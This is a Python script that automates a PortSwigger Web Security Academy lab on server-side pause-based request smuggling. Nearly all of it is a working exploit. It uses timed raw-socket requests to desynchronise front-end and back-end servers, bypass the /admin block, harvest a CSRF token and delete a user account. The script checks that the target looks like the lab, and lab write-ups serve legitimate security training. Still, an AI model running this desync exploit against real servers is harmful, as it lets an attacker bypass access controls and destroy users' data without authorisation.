#!/usr/bin/env python3
"""
Automated solver: PortSwigger Web Security Academy
Lab "Server-side pause-based request smuggling" (EXPERT)

Usage:
    uv run python solve.py --url "https://TARGET_URL/" [--outdir DIR]

Technique (pause-based CL.0 server-side desync):
  * Front-end (Apache) streams client bytes to the back-end immediately and
    blocks /admin* per request (403 JSON). Front-end read timeout ~120 s.
  * Back-end (Apache) read timeout ~60 s: on timeout it treats the partial
    request as complete (CL.0-like), self-generates a response (for
    server-level-redirect endpoints like /resources: a 302), and keeps the
    connection open.
  * So: send  POST <redir>  headers with Content-Length = L, pause > 60 s
    (back-end times out while front-end is still inside request 1), then send
    L bytes. Front-end treats them as request-1 body (its /admin block never
    fires); the back-end parses them as a NEW request.
  * Front-end pairs back-end responses with client requests in order, so a
    sacrificial follow-up GET / is sent to receive the smuggled response in-band.

Nothing instance-specific is hardcoded:
  * host  <- --url
  * redirect endpoint <- discovered by probing (GET <path> -> 3xx <path>/)
  * CSRF  <- harvested live from smuggled GET /admin/ (Host: localhost)
  * pause <- default 62 s, adaptively swept if the default fails
Exit code 0 iff the lab status widget reports solved.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
from urllib.parse import urlparse

# --- lab-definition constants (from the lab spec, not from any instance) ---
ADMIN_PATH = "/admin/"            # admin panel (spec: "admin panel at /admin")
DELETE_PATH = "/admin/delete/"    # delete-user form target (slash form keeps POST body)
USERNAME = "carlos"               # spec: "delete the user carlos"
SOLVED_MARKER = b"widgetcontainer-lab-status is-solved"
NOT_SOLVED_MARKER = b"widgetcontainer-lab-status is-notsolved"

RECON_CANDIDATES = [
    "/resources", "/image", "/my-account", "/css", "/js", "/static", "/media",
    "/assets", "/img", "/files", "/uploads", "/post", "/view", "/category",
    "/home", "/blog", "/login", "/api", "/store", "/product",
]
BACKEND_HOSTS = ["localhost", "127.0.0.1"]
PAUSE_SWEEPS = [
    [62.0],
    [45.0, 55.0, 70.0, 80.0, 95.0],
    [30.0, 38.0, 50.0, 60.0, 100.0, 110.0, 115.0],
]

# ---------------------------------------------------------------- utilities

class Conn:
    """Raw TLS HTTP/1.1 socket with exact byte-level send control."""

    def __init__(self, host: str):
        self.host = host
        self.n_requests = 0
        self.n_bytes = 0
        ctx = ssl.create_default_context()
        ctx.set_alpn_protocols(["http/1.1"])
        s = socket.create_connection((host, 443), timeout=30)
        self.sock = ctx.wrap_socket(s, server_hostname=host)

    def send_request(self, raw: bytes):
        self.sock.sendall(raw)
        self.n_requests += 1
        self.n_bytes += len(raw)

    def send_partial(self, raw: bytes):
        self.sock.sendall(raw)
        self.n_bytes += len(raw)

    def recv(self, max_wait: float = 20.0, idle: float = 2.0):
        self.sock.settimeout(idle)
        data = b""
        eof = False
        t0 = time.time()
        while time.time() - t0 < max_wait:
            try:
                c = self.sock.recv(65536)
                if not c:
                    eof = True
                    break
                data += c
            except socket.timeout:
                continue
        return data, eof

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def parse_resps(data: bytes) -> list[dict]:
    """Split raw bytes into {status, head, body} (Content-Length & chunked aware)."""
    out = []
    rest = data
    while True:
        m = re.match(rb"HTTP/1\.[01] (\d{3})[^\r]*\r\n", rest)
        if not m:
            break
        head, sep, body = rest.partition(b"\r\n\r\n")
        if not sep:
            break
        cl = None
        chunked = False
        for line in head.split(b"\r\n")[1:]:
            if b":" in line:
                k, v = line.split(b":", 1)
                kl = k.strip().lower()
                if kl == b"content-length":
                    try:
                        cl = int(v)
                    except ValueError:
                        pass
                if kl == b"transfer-encoding" and b"chunked" in v:
                    chunked = True
        if cl is not None:
            out.append({"status": int(m.group(1)), "head": head, "body": body[:cl]})
            rest = body[cl:]
        elif chunked:
            buf = b""
            r2 = body
            while True:
                lm, _, r2 = r2.partition(b"\r\n")
                try:
                    n = int(lm.split(b";")[0], 16)
                except Exception:
                    break
                if n == 0 or len(r2) < n:
                    break
                buf += r2[:n]
                r2 = r2[n + 2:]
            out.append({"status": int(m.group(1)), "head": head, "body": buf})
            rest = b""
        else:
            out.append({"status": int(m.group(1)), "head": head, "body": body})
            rest = b""
    return out


def header_value(head: bytes, name: str) -> str:
    for line in head.split(b"\r\n")[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            if k.strip().lower().decode() == name:
                return v.strip().decode(errors="replace")
    return ""


def extract_csrf(html: bytes):
    for tag in re.findall(rb"<input[^>]*>", html):
        if b'name="csrf"' in tag or b"name=csrf" in tag:
            m = re.search(rb'value="([^"]+)"', tag)
            if m:
                return m.group(1).decode()
    m = (re.search(rb'name="csrf"[^>]{0,200}?value="([A-Za-z0-9]+)"', html)
         or re.search(rb'value="([A-Za-z0-9]+)"[^>]{0,200}?name="csrf"', html))
    return m.group(1).decode() if m else None


# ---------------------------------------------------------------- operations

def do_get(host: str, path: str, read_wait: float = 10.0):
    c = Conn(host)
    c.send_request(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode())
    data, eof = c.recv(read_wait)
    c.close()
    return parse_resps(data), c, data, eof


def find_redirect_endpoints(host: str, log, add_stats) -> list[str]:
    """Paths p where GET p -> 3xx with Location p/  (server-level redirect dirs)."""
    found = []
    lock = threading.Lock()

    def probe(p):
        try:
            resps, c, raw, _ = do_get(host, p, read_wait=5)
            add_stats(c.n_requests, c.n_bytes)
            if resps and resps[0]["status"] in (301, 302, 303, 307, 308):
                loc = header_value(resps[0]["head"], "location")
                if loc == p + "/":
                    with lock:
                        found.append(p)
                    log(f"redirect endpoint found: {p} -> {loc}")
        except Exception as e:
            log(f"probe {p} error: {type(e).__name__}: {e}")

    threads = [threading.Thread(target=probe, args=(p,)) for p in RECON_CANDIDATES]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return found


def smuggle_attempt(host: str, redir: str, pause: float, payload: bytes,
                    sacrifice: bool = True, read_wait: float = 20.0):
    """
    One desync attempt on a fresh connection:
      headers(POST redir, CL=len(payload)) -> sleep(pause) -> payload -> [GET /]
    Returns (resps, sent_bytes, eof, conn_stats).
    """
    c = Conn(host)
    hdr = (f"POST {redir} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(payload)}\r\n\r\n").encode()
    c.send_request(hdr)
    time.sleep(pause)
    c.send_partial(payload)
    sac = b""
    if sacrifice:
        time.sleep(0.1)
        sac = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode()
        c.send_request(sac)
    data, eof = c.recv(read_wait)
    c.close()
    return parse_resps(data), hdr + payload + sac, eof, (c.n_requests, c.n_bytes)


def infra_down(resps: list[dict]) -> bool:
    """502/504 (or no response) on the first response = lab infrastructure down."""
    if not resps:
        return True
    return resps[0]["status"] in (502, 503, 504)


def harvest_once(host: str, redir: str, pause: float, be_host: str, log, tag: str):
    """Smuggle GET /admin/ (Host be_host); return (csrf|None, diag, resps, sent, eof, conn_stats)."""
    payload = f"GET {ADMIN_PATH} HTTP/1.1\r\nHost: {be_host}\r\n\r\n".encode()
    resps, sent, eof, stats = smuggle_attempt(host, redir, pause, payload)
    diag = {"tag": tag, "redir": redir, "pause": pause, "be_host": be_host,
            "statuses": [r["status"] for r in resps]}
    csrf = None
    if len(resps) >= 2:
        csrf = extract_csrf(resps[1]["body"])
    if csrf:
        diag["result"] = "csrf_harvested"
    elif resps and resps[0]["status"] == 400:
        diag["result"] = "frontend_read_timeout (pause too long)"
    elif len(resps) >= 2 and resps[1]["status"] == 403:
        diag["result"] = "admin blocked (smuggled req parsed by front-end?)"
    elif len(resps) == 1:
        diag["result"] = "no 2nd response (desync missed? pause within window?)"
    elif len(resps) >= 2:
        diag["result"] = f"2nd resp {resps[1]['status']} (in-sync? no desync)"
    else:
        diag["result"] = "no responses"
    log(f"[{tag}] {diag}")
    return csrf, diag, resps, sent, eof, stats


def main() -> int:
    ap = argparse.ArgumentParser(description="Solve 'Server-side pause-based request smuggling' lab")
    ap.add_argument("--url", required=True)
    ap.add_argument("--outdir", default=".")
    ap.add_argument("--allow-mismatch", action="store_true",
                    help="Continue even when the page title does not look like this lab "
                         "(default: abort fast on a title mismatch, e.g. wrong lab URL)")
    args = ap.parse_args()

    host = urlparse(args.url).netloc
    t_start = time.time()
    run_ts = time.strftime("%Y%m%d_%H%M%S")
    run_dir = os.path.join(args.outdir, "evidence", f"run_{run_ts}")
    os.makedirs(run_dir, exist_ok=True)
    os.makedirs(os.path.join(args.outdir, "logs"), exist_ok=True)
    logf = open(os.path.join(args.outdir, "logs", f"solve_{run_ts}.log"), "w")

    def log(msg: str):
        line = f"[{time.time() - t_start:8.1f}s] {msg}"
        print(line, flush=True)
        logf.write(line + "\n")
        logf.flush()

    stats = {"requests": 0, "bytes": 0}
    stats_lock = threading.Lock()

    def add_stats(n_req: int, n_bytes: int):
        with stats_lock:
            stats["requests"] += n_req
            stats["bytes"] += n_bytes

    log(f"TARGET host={host} url={args.url}")

    # ---------------- Phase 0: recon ----------------
    log("PHASE 0 recon: GET /")
    resps, c, raw, _ = do_get(host, "/", 10)
    add_stats(c.n_requests, c.n_bytes)
    home = resps[0]["body"] if resps else b""
    tm = re.search(rb"<title>(.*?)</title>", home, re.S)
    title = tm.group(1).decode(errors="replace") if tm else "?"
    log(f"title: {title}")
    open(os.path.join(run_dir, "recon_home.html"), "wb").write(raw)
    if "pause-based" not in title.lower():
        if args.allow_mismatch:
            log("WARNING: page title does not mention 'pause-based'; continuing "
                "(--allow-mismatch set)")
        else:
            log(f"FATAL: page title '{title}' does not mention 'pause-based' — this "
                "target does not look like this lab. Aborting before burning sweep time. "
                "Pass --allow-mismatch to continue anyway.")
            report_fail(log, args, t_start, stats, run_dir,
                        reason=f"title mismatch: '{title}' "
                               "(not a server-side pause-based request smuggling lab)")
            return 1

    log("PHASE 0 recon: probing redirect endpoints (parallel)")
    redirs = find_redirect_endpoints(host, log, add_stats)
    if not redirs:
        log("WARNING: no redirect endpoints discovered; falling back to /resources")
        redirs = ["/resources"]
    log(f"redirect candidates: {redirs}")
    open(os.path.join(run_dir, "recon_redirects.json"), "w").write(json.dumps(redirs, indent=1))

    # infra sanity: if the lab itself is down, fail fast (don't burn sweeps)
    if infra_down(resps):
        log(f"FATAL: lab infrastructure appears down (GET / -> {resps[0]['status'] if resps else 'no response'})")
        report_fail(log, args, t_start, stats, run_dir,
                    reason=f"lab infrastructure down (GET / status {resps[0]['status'] if resps else 'none'})")
        return 1

    # ---------------- Phase 1: harvest CSRF (adaptive redir x pause) --------
    csrf = None
    chosen = None
    for redir in redirs[:3]:
        for sweep_i, sweep in enumerate(PAUSE_SWEEPS):
            results = {}
            rlock = threading.Lock()

            def worker(p, be_host=BACKEND_HOSTS[0], redir=redir):
                csrf_, diag, resps, sent, eof, cstats = harvest_once(host, redir, p, be_host, log, f"r{redir}_s{sweep_i}_p{p:g}")
                add_stats(cstats[0], cstats[1])
                with rlock:
                    results[p] = (csrf_, diag, resps, sent, eof)

            threads = [threading.Thread(target=worker, args=(p,)) for p in sweep]
            t_sweep = time.time()
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            log(f"redir={redir} sweep {sweep_i} ({sweep}) took {time.time() - t_sweep:.1f}s")
            if results and all(infra_down(r[2]) for r in results.values()):
                log("FATAL: lab infrastructure appears down (502/504 on all attempts)")
                report_fail(log, args, t_start, stats, run_dir,
                            reason="lab infrastructure down (502/504 on smuggling attempts)")
                return 1
            for p, (csrf_, diag, resps, sent, eof) in results.items():
                if csrf_:
                    csrf = csrf_
                    chosen = {"redir": redir, "pause": p, "be_host": BACKEND_HOSTS[0]}
                    open(os.path.join(run_dir, f"harvest_p{p:g}_raw.txt"), "wb").write(
                        f"PAUSE {p}\nSENT\n".encode() + sent + b"\n\n")
                    log(f"HARVEST OK: csrf={csrf_} (pause={p}, redir={redir})")
                    break
            if csrf:
                break
        if csrf:
            break
        log(f"redir={redir} failed all pause sweeps; trying next candidate")
    if not csrf:
        # last resort: second back-end host candidate
        for p in PAUSE_SWEEPS[0]:
            csrf_, diag, resps, sent, eof, cstats = harvest_once(host, redirs[0], p, BACKEND_HOSTS[1], log, f"fallback_p{p:g}")
            add_stats(cstats[0], cstats[1])
            if csrf_:
                csrf = csrf_
                chosen = {"redir": redirs[0], "pause": p, "be_host": BACKEND_HOSTS[1]}
                log(f"FALLBACK HARVEST OK: csrf={csrf_}")
                break
    if not csrf:
        log("FATAL: could not harvest CSRF from admin panel")
        report_fail(log, args, t_start, stats, run_dir, reason="csrf harvest failed")
        return 1

    # ---------------- Phase 2: delete carlos ----------------
    def do_delete(csrf_val: str):
        body = f"csrf={csrf_val}&username={USERNAME}".encode()
        payload = (b"POST " + DELETE_PATH.encode() + b" HTTP/1.1\r\nHost: "
                   + chosen["be_host"].encode() + b"\r\n"
                   b"Content-Type: x-www-form-urlencoded\r\nContent-Length: "
                   + str(len(body)).encode() + b"\r\n\r\n" + body)
        return smuggle_attempt(host, chosen["redir"], chosen["pause"], payload)

    resps, sent, eof, sstats = do_delete(csrf)
    add_stats(sstats[0], sstats[1])
    open(os.path.join(run_dir, "delete_raw.txt"), "wb").write(
        f"PAUSE {chosen['pause']}\nSENT\n".encode() + sent + b"\n\n")
    log(f"DELETE attempt: statuses={[r['status'] for r in resps]}")
    for i, r in enumerate(resps):
        log(f"  resp{i}: {r['status']} head={r['head'][:120]!r} body={r['body'][:160]!r}")

    delete_ok = len(resps) >= 2 and resps[1]["status"] in (200, 302, 303) and b"Invalid CSRF" not in resps[1]["body"]
    if not delete_ok:
        log("DELETE not confirmed (possible invalid CSRF) — re-harvesting and retrying once")
        csrf2, diag2, resps2, sent2, eof2, cstats2 = harvest_once(host, chosen["redir"], chosen["pause"], chosen["be_host"], log, "reharvest")
        add_stats(cstats2[0], cstats2[1])
        if csrf2:
            resps, sent, eof, sstats = do_delete(csrf2)
            add_stats(sstats[0], sstats[1])
            open(os.path.join(run_dir, "delete_retry_raw.txt"), "wb").write(sent)
            log(f"DELETE retry: statuses={[r['status'] for r in resps]}")
            delete_ok = len(resps) >= 2 and resps[1]["status"] in (200, 302, 303) and b"Invalid CSRF" not in resps[1]["body"]

    # ---------------- Phase 3: verify lab state ----------------
    log("PHASE 3 verify: GET / (lab status widget)")
    time.sleep(1)
    resps, c, raw, _ = do_get(host, "/", 10)
    add_stats(c.n_requests, c.n_bytes)
    open(os.path.join(run_dir, "verify_final.html"), "wb").write(raw)
    solved = SOLVED_MARKER in raw and NOT_SOLVED_MARKER not in raw
    sm = re.search(rb"<p>(Not solved|Solved)</p>", raw)
    log(f"VERIFY: solved={solved} widget={sm.group(1).decode() if sm else '?'}")

    report = {
        "url": args.url,
        "host": host,
        "solved": bool(solved),
        "elapsed_s": round(time.time() - t_start, 1),
        "http_requests_sent": stats["requests"],
        "http_bytes_sent": stats["bytes"],
        "chosen_attack": chosen,
        "csrf_harvested": csrf,
        "delete_confirmed": bool(delete_ok),
        "verify_marker": SOLVED_MARKER.decode(),
    }
    with open(os.path.join(run_dir, "report.json"), "w") as f:
        json.dump(report, f, indent=1)
    logf.close()
    print("\n===== REPORT =====")
    print(json.dumps(report, indent=1))
    return 0 if solved else 1


def report_fail(log, args, t_start, stats, run_dir, reason):
    report = {"url": args.url, "solved": False, "reason": reason,
              "elapsed_s": round(time.time() - t_start, 1),
              "http_requests_sent": stats["requests"], "http_bytes_sent": stats["bytes"]}
    with open(os.path.join(run_dir, "report.json"), "w") as f:
        json.dump(report, f, indent=1)
    print(json.dumps(report, indent=1))


if __name__ == "__main__":
    sys.exit(main())
